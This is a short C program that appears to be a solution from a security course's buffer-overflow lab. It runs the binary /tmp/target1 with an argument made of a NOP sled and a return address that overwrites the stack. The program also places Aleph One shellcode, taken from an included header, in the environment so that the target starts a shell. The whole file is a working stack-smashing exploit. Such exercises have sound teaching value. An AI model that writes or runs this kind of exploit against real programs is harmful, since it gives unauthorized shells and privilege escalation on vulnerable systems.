#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3]; 
  char *env[1];

  args[0] = TARGET;
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\xb9\xff\xff\xbf";
  // 0xbffffe50
  args[2] = NULL;
  
  env[0] = shellcodeAlephOne;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


